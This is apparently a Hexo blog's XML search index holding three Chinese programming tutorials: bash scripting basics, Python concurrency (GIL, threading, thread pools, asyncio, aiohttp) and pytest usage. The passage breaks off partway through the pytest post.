<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>shell编程</title>
      <link href="/2021/12/11/shell1/"/>
      <url>/2021/12/11/shell1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ubuntu 下进行测试</p></blockquote><h2 id="shell-简介"><a href="#shell-简介" class="headerlink" title="shell 简介"></a>shell 简介</h2><p>shell 是在 linux 环境下执行的一种脚本语言。</p><p>shell 的类型</p><ul><li>sh</li><li>dash</li><li>bash （标准）</li><li>rbash</li></ul><p>使用以下命令查看当前操作系统支持的 shell 语言：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells</code></pre><p>使用以下命令查看 bash 的位置</p><pre class=" language-bash"><code class="language-bash"><span class="token function">which</span> <span class="token function">bash</span></code></pre><h2 id="bash-编写"><a href="#bash-编写" class="headerlink" title="bash 编写"></a>bash 编写</h2><p>新建 .sh 文件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> hello.sh</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span> <span class="token comment" spellcheck="true"># 注释</span><span class="token keyword">echo</span> <span class="token string">"hello world"</span></code></pre><ul><li><p>1 ： bash 的位置，让解释器知道这个文件是bash 语言编写的，要按照 bash 的规则解释</p></li><li><p>2: 在屏幕上打印 hello world</p></li></ul><p>更改 .sh 文件的权限用于执行</p><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> +x hello.sh</code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>使用 $ 来引用变量</p><ul><li>系统变量：系统变量由操作系统创建和维护，一般情况下大写</li><li>用户变量： 用户自定义</li></ul><h4 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h4><p>直接引用，不用声明变量</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token variable">$BASH</span>  <span class="token comment" spellcheck="true"># 打印输出bash的位置</span><span class="token keyword">echo</span> <span class="token variable">$BASH_VERSION</span> <span class="token comment" spellcheck="true"># 打印bash版本</span><span class="token keyword">echo</span> <span class="token variable">$HOME</span>  <span class="token comment" spellcheck="true"># home目录</span><span class="token keyword">echo</span> <span class="token variable">$PWD</span>  <span class="token comment" spellcheck="true"># 当前工作的目录</span></code></pre><h4 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h4><p>需要声明变量，变量名不能以数字开头，否则不能识别</p><pre class=" language-bash"><code class="language-bash">name <span class="token operator">=</span> Mark<span class="token keyword">echo</span> <span class="token string">"The name is <span class="token variable">$name</span>"</span></code></pre><h3 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"Enter name: "</span><span class="token function">read</span> name  <span class="token comment" spellcheck="true"># 将用户输入值保存为变量 name</span><span class="token keyword">echo</span> <span class="token string">"my name is <span class="token variable">$name</span>"</span></code></pre><p><strong>多个变量</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'Enter your name:'</span><span class="token function">read</span> name1 name2 name3</code></pre><h4 id="实时显示用户输入"><a href="#实时显示用户输入" class="headerlink" title="实时显示用户输入"></a>实时显示用户输入</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">read</span> -p <span class="token string">'username: '</span> user_var <span class="token comment" spellcheck="true"># 显示用户输入</span><span class="token function">read</span> -sp <span class="token string">'password: '</span> pass_var  <span class="token comment" spellcheck="true"># 静默输入，不会显示用户输入的内容</span></code></pre><h4 id="输入数组"><a href="#输入数组" class="headerlink" title="输入数组"></a>输入数组</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"Enter name: "</span><span class="token function">read</span> -a names<span class="token keyword">echo</span> <span class="token string">"Names: <span class="token variable">${names[0]}</span> <span class="token variable">${names[1]}</span>"</span></code></pre><h4 id="按照输入位置传递参数"><a href="#按照输入位置传递参数" class="headerlink" title="按照输入位置传递参数"></a>按照输入位置传递参数</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token variable">$1</span> <span class="token variable">$2</span> <span class="token variable">$3</span>args <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"<span class="token variable">$@</span>"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 按位置获取所有参数并传到一个数组中</span><span class="token keyword">echo</span> <span class="token variable">${args[0]}</span> <span class="token variable">${args[1]}</span> <span class="token variable">${args[2]}</span>  <span class="token comment" spellcheck="true"># 打印参数</span><span class="token keyword">echo</span> $<span class="token comment" spellcheck="true"># # 打印参数数量</span></code></pre><pre class=" language-bash"><code class="language-bash">./bash.sh zby zby1 zby2  <span class="token comment" spellcheck="true"># 执行命令</span>zby zby1 zby2  <span class="token comment" spellcheck="true"># 输出</span>3</code></pre><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> condition <span class="token punctuation">]</span><span class="token keyword">then</span>   statement<span class="token keyword">elif</span> <span class="token keyword">then</span>   statement1<span class="token keyword">else</span>  statement2<span class="token keyword">fi</span>  <span class="token comment" spellcheck="true"># 结束if</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>count <span class="token operator">=</span> 10 <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$count</span> -eq 9 <span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># count 是否等于 9</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"condition is true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"condition is false"</span><span class="token keyword">fi</span></code></pre><blockquote><p>注： 在 [ ] 前后要加空格再写表达式，否则可能会出崔</p></blockquote><h4 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h4><h5 id="整型比较"><a href="#整型比较" class="headerlink" title="整型比较"></a>整型比较</h5><ul><li>-eq ： equal  等于</li><li>-ne ： not equal 不等于</li><li>-gt  ： greater than 大于</li><li>-ge : greater than or equal 大于等于</li><li>-lt : less than 小于</li><li>-le: less than or equal 小于等于</li></ul><h5 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h5><ul><li>= ： 等于</li><li>== ： 等于</li><li>!= : 不等于</li><li><blockquote></blockquote></li><li>&lt;</li><li>-z ： 字符串为空</li></ul><blockquote><p>bash中 = 和 == 都可以用来比较两个字符串是否相等</p></blockquote><h3 id="文件运算符"><a href="#文件运算符" class="headerlink" title="文件运算符"></a>文件运算符</h3><h4 id="文件是否存在"><a href="#文件是否存在" class="headerlink" title="文件是否存在"></a>文件是否存在</h4><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token keyword">echo</span> -e <span class="token string">"Enter the name of file: \c"</span> <span class="token comment" spellcheck="true"># -e 用于解释\c，\c 将光标保持到一行上</span><span class="token function">read</span> file_name<span class="token keyword">if</span> <span class="token punctuation">[</span> -e <span class="token variable">$file_Name</span> <span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#判断文件是否存在</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$fine_name</span> found"</span><span class="token keyword">else</span>  <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$file_name</span> not found"</span><span class="token keyword">fi</span></code></pre><ul><li>-e 文件是否存在</li><li>-f 文件是否是一个常规文件</li><li>-d 目录是否存在</li><li>-b 判断文件是否是block special file，二进制文件，如视频、音乐图片等文件</li><li>-c 判断文件是否是character special file，是否是字符文件，普通文本等</li><li>-s 判断文件是否为空</li><li>-r -w -x 判断文件是否有读、写、执行权限</li></ul><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><pre class=" language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$age</span>"</span> -gt 18 -a <span class="token string">"<span class="token variable">$age</span>"</span> -lt 30 <span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># -a 表示and</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$age</span>"</span> -gt 18 <span class="token operator">&amp;&amp;</span> <span class="token string">"<span class="token variable">$age</span>"</span> -lt 30 <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token string">"<span class="token variable">$age</span>"</span> -get 18 <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$age</span>"</span> -lt 30 <span class="token punctuation">]</span></code></pre><h4 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h4><pre class=" language-bash"><code class="language-bash">num1 <span class="token operator">=</span> 50num2 <span class="token operator">=</span> 6<span class="token keyword">echo</span> <span class="token variable"><span class="token variable">$((</span> num1 <span class="token operator">+</span> num2 <span class="token variable">))</span></span><span class="token keyword">echo</span> <span class="token variable"><span class="token variable">$((</span> num1 \<span class="token operator">*</span> num2 <span class="token variable">))</span></span> <span class="token comment" spellcheck="true"># 使用乘法运算时要用/ 转义</span><span class="token keyword">echo</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">expr</span> num1 \* num2 <span class="token variable">)</span></span> <span class="token comment" spellcheck="true"># 使用expr 不用加括号</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高阶编程(1)</title>
      <link href="/2021/11/27/python-gao1/"/>
      <url>/2021/11/27/python-gao1/</url>
      
        <content type="html"><![CDATA[<h2 id="GIL全局解释锁"><a href="#GIL全局解释锁" class="headerlink" title="GIL全局解释锁"></a>GIL全局解释锁</h2><ul><li>GIL与python语言没有关系，仅仅由于历史原因在Cpython虚拟机(解释器)中难以移除</li><li>每个线程在执行的过程中都要先获取GIL，保证同一时刻只有一个线程可以执行代码</li><li>线程释放GIL：在IO操作等可能会引起阻塞的system call之前，可以暂时释放GIL，但在执行完毕后，必须重新获取GIL</li><li>Python可以使用多进程来利用多核的CPU资源</li><li>多线程在网络编程中比单线程性能有提升，因为碰到IO阻塞会自动释放GIL锁(发送请求的等待响应时立马发送下一个请求)</li></ul><blockquote><p>计算密集型使用CUP用进程，IO密集型用线程、协程，线程和协程只有一个CPU在计算</p></blockquote><h2 id="深拷贝、浅拷贝"><a href="#深拷贝、浅拷贝" class="headerlink" title="深拷贝、浅拷贝"></a>深拷贝、浅拷贝</h2><p>Python中的深拷贝会复制对象本身并新建一个对象，浅拷贝则只是在原本的对象中加了一个新的引用。</p><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>b <span class="token operator">=</span> a  <span class="token comment" spellcheck="true">#将b指向列表，并没有新建一个[1,2]列表,C语言会新建一个一样的列表，即在python中a,b的地址一样</span></code></pre><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> copya <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>b <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#新建一个[1,2]的列表，ab的地址不同</span></code></pre><h2 id="python-并发"><a href="#python-并发" class="headerlink" title="python 并发"></a>python 并发</h2><p>引入并发，是为了提升程序运行速度</p><p><img src="https://pic.imgdb.cn/item/61a1e4a52ab3f51d9114a94e.jpg" alt=""></p><p><img src="https://pic.imgdb.cn/item/61a1e5032ab3f51d9114d6ee.jpg" alt=""></p><h3 id="python-并发编程的三种方式"><a href="#python-并发编程的三种方式" class="headerlink" title="python 并发编程的三种方式"></a>python 并发编程的三种方式</h3><h4 id="CPU密集型和IO密集型"><a href="#CPU密集型和IO密集型" class="headerlink" title="CPU密集型和IO密集型"></a>CPU密集型和IO密集型</h4><p><img src="https://pic.imgdb.cn/item/61a1e5fb2ab3f51d9115348c.jpg" alt=""></p><h4 id="多线程、多进程、多协程"><a href="#多线程、多进程、多协程" class="headerlink" title="多线程、多进程、多协程"></a>多线程、多进程、多协程</h4><p><img src="https://pic.imgdb.cn/item/61a1e6f82ab3f51d9115a16a.jpg" alt=""></p><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/61a1e7912ab3f51d9115e8af.jpg" alt=""></h4><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>1、准备一个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    do_something<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span></code></pre><p>2、多线程</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threadingt <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>my_func<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#创建一个线程</span>t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#启动线程</span>t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#等待结束</span></code></pre><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">multi_thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>        threading<span class="token punctuation">.</span>Tread<span class="token punctuation">(</span>target<span class="token operator">=</span>my_func<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="lock解决线程安全问题"><a href="#lock解决线程安全问题" class="headerlink" title="lock解决线程安全问题"></a>lock解决线程安全问题</h3><p><img src="https://pic.imgdb.cn/item/61a324bd2ab3f51d91b0af34.jpg" alt=""></p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p><img src="https://pic.imgdb.cn/item/61a326332ab3f51d91b21b2d.jpg" alt=""></p><p><img src="https://pic.imgdb.cn/item/61a3268b2ab3f51d91b25bb8.jpg" alt=""></p><h3 id="使用进程池的好处"><a href="#使用进程池的好处" class="headerlink" title="使用进程池的好处"></a>使用进程池的好处</h3><p><img src="https://pic.imgdb.cn/item/61a326ee2ab3f51d91b2afb3.jpg" alt=""></p><h3 id="TreadPoolExecutor"><a href="#TreadPoolExecutor" class="headerlink" title="TreadPoolExecutor"></a>TreadPoolExecutor</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> TreadPoolExecutor<span class="token punctuation">,</span>as_completed</code></pre><h4 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">as</span> pool<span class="token punctuation">:</span>    results <span class="token operator">=</span> pool<span class="token punctuation">.</span>map<span class="token punctuation">(</span>my_func<span class="token punctuation">,</span>urls<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#my_func为执行函数名，urls为参数列表</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h4 id="future模式-更强大"><a href="#future模式-更强大" class="headerlink" title="future模式 更强大"></a>future模式 更强大</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">as</span> pool<span class="token punctuation">:</span>    futures <span class="token operator">=</span> <span class="token punctuation">[</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>my_func<span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">]</span>    <span class="token keyword">for</span> future <span class="token keyword">in</span> futures<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#等待执行结果进行返回</span>    <span class="token keyword">for</span> future <span class="token keyword">in</span> as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#使用as_completed顺序不固定</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#先执行完的先返回</span></code></pre><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><img src="https://pic.imgdb.cn/item/61a32d602ab3f51d91b57310.jpg" alt=""></p><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p><img src="https://pic.imgdb.cn/item/61a32fbd2ab3f51d91b64f35.jpg" alt=""></p><h3 id="python异步IO库介绍：asyncio"><a href="#python异步IO库介绍：asyncio" class="headerlink" title="python异步IO库介绍：asyncio"></a>python异步IO库介绍：asyncio</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> asyncio<span class="token comment" spellcheck="true">#获取事件循环</span>loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#定义协程</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">my_func</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">await</span> get_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#io走到这里不进行阻塞(等待)而是获取下一个事件循环</span><span class="token comment" spellcheck="true">#创建task列表</span>tasks <span class="token operator">=</span> <span class="token punctuation">[</span>loop<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>my_func<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#对应第一行代码</span><span class="token comment" spellcheck="true">#执行事件列表</span>loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>注：requests库不支持异步，要使用aiohttp实现</p></blockquote><h2 id="aiohttp"><a href="#aiohttp" class="headerlink" title="aiohttp"></a>aiohttp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> aiohttp<span class="token keyword">import</span> asyncio<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 创建aiohttp会话处理请求</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 要执行的任务</span>        <span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">:</span>            task <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>ensure_future<span class="token punctuation">(</span>download<span class="token punctuation">(</span>session<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 需要异步执行的函数,不用等结果返回</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>task<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获取tasks内容，*tasks表示task1 task2 ...., result是一个保存所有任务执行download()后返回的数据的列表，</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> response<span class="token punctuation">:</span>        result_data <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result_data<span class="token comment" spellcheck="true"># 运行异步函数需要使用循环</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创造循环</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pytest</title>
      <link href="/2021/04/09/pytest/"/>
      <url>/2021/04/09/pytest/</url>
      
        <content type="html"><![CDATA[<h2 id="Pytest单元测试框架"><a href="#Pytest单元测试框架" class="headerlink" title="Pytest单元测试框架"></a>Pytest单元测试框架</h2><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>单元测试是指<strong>在软件开发中，针对软件的最小单位（函数、方法）进行正确性的检查测试</strong></p><h3 id="单元测试的作用"><a href="#单元测试的作用" class="headerlink" title="单元测试的作用"></a>单元测试的作用</h3><ul><li>1、测试发现：从多个文件里去找到测试用例</li><li>2、测试执行：按照一定的顺序和规则去执行，并生成结果</li><li>3、测试判断：通过断言判断预期结果和实际结果的差异</li><li>4、测试报告：统计测试进度，耗时，通过率，生成测试报告</li></ul><h2 id="自动化测试框架"><a href="#自动化测试框架" class="headerlink" title="自动化测试框架"></a>自动化测试框架</h2><h3 id="自动化测试框架的作用"><a href="#自动化测试框架的作用" class="headerlink" title="自动化测试框架的作用"></a>自动化测试框架的作用</h3><ul><li>提高测试效率，降低维护成本</li><li>减少人工干预，提高测试的准确性，增加戴拿的重用性</li><li>核心思想是让不懂代码的人也能通过这个框架实现自动化测试</li></ul><h3 id="pytest单元测试框架和自动化测试框架的关系"><a href="#pytest单元测试框架和自动化测试框架的关系" class="headerlink" title="pytest单元测试框架和自动化测试框架的关系"></a>pytest单元测试框架和自动化测试框架的关系</h3><p>单元测试框架是自动化测试框架中的组成部分之一</p><h2 id="pytest简介"><a href="#pytest简介" class="headerlink" title="pytest简介"></a>pytest简介</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><ul><li><font color=orange>pytest-html</font> 生成html格式的自动化测试报告</li><li><font color=orange>pytest-xdist</font> 测试用例分布式执行，多CPU分发</li><li><font color=orange>pytest-ordering</font> 用于改变测试用例的执行顺序</li><li><font color=orange>pytest-rerunfaliures</font> 用例失败后重跑</li><li><font color=orange>allure-pytest</font> 用于生成美观的测试报告</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> pytest</code></pre><h3 id="使用pytest默认规则及基础应用"><a href="#使用pytest默认规则及基础应用" class="headerlink" title="***使用pytest默认规则及基础应用"></a>***使用pytest默认规则及基础应用</h3><ul><li>模块名必须以<font color=orange>test_</font> 开头或 <font color=orange>  _test</font> 结尾(文件名)</li><li>测试类必须以<font color=orange>Test</font> 开头，并且不能有init方法 </li><li>测试方法必须以<font color=orange>test</font> 开头</li></ul><h3 id="pytest测试用例的运行方式"><a href="#pytest测试用例的运行方式" class="headerlink" title="pytest测试用例的运行方式"></a>pytest测试用例的运行方式</h3><h4 id="主函数模式"><a href="#主函数模式" class="headerlink" title="主函数模式"></a>主函数模式</h4><p><strong>运行所有</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pytest.main(['-s'])</span></code></pre><p><strong>运行指定模块</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'-vs'</span><span class="token punctuation">,</span><span class="token string">'test_login.py'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><strong>指定目录</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'-vs'</span><span class="token punctuation">,</span><span class="token string">'./test_login.py'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><strong>执行某个函数</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'-vs'</span><span class="token punctuation">,</span><span class="token string">'./test/test_login.py::test_login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#执行test目录下test_login文件中的test_login函数</span></code></pre><p>执行某个类的方法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    pytest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'-vs'</span><span class="token punctuation">,</span><span class="token string">'./test/test_login.py::TestLogin::test_login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#执行test目录下test_login文件中的Test类中的test_login方法</span></code></pre><blockquote><p>执行方法一定要固定位置，其他运行参数必须在以上这两个参数之后才能执行成功</p></blockquote><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><p><strong>运行所有</strong></p><p>在项目所在位置打开终端执行以下命令：</p><pre class=" language-bash"><code class="language-bash">pytest</code></pre><p><strong>运行指定模块</strong></p><pre><code>pytest -vs test_login.py</code></pre><p><strong>指定目录</strong></p><pre><code>pytest -vs ./test_login.py</code></pre><p><strong>指定函数</strong></p><pre><code>pytest ./test/test_login.py::test_login</code></pre><p><strong>指定类中的方法</strong></p><pre><code>/test/test_login.py::TestLogin::test_login</code></pre><blockquote><p>参数详解</p><p>-s ： 表示输出调试信息，包括print打印的信息</p><p>-vs: 输出print信息的同时输出相应类名模块名</p><p>-n 支持多线程或分布式运行测试用例</p><p>-reruns NUM: 失败用例重跑</p><p>-x: 只要一个用例出错，测试就停止</p><p> –maxfall 2: 用例失败2个就停止测试</p><p>-k: 根据测试用例的部分字符串指定测试用例  pytest -vs ./testcase -k ‘ao’ 执行所有带有ao字符串的函数</p></blockquote><h4 id="通过读取pytest-ini配置文件运行-常用"><a href="#通过读取pytest-ini配置文件运行-常用" class="headerlink" title="通过读取pytest.ini配置文件运行(常用)"></a>通过读取pytest.ini配置文件运行(常用)</h4><p>pytest.ini 文件时pytest单元测试框架的核心配置文件</p><ul><li>位置：放在项目的根目录(与测试用例同级)</li><li>编码：必须是ANSI，可以使用notpad++修改编码格式(菜单栏编码 )</li><li>作用：改变pytests默认的行为</li><li>运行的规则：不管是主函数的模式运行，命令行模式运行。都会读取这个文件</li></ul><p><strong>pytest.ini</strong> </p><pre class=" 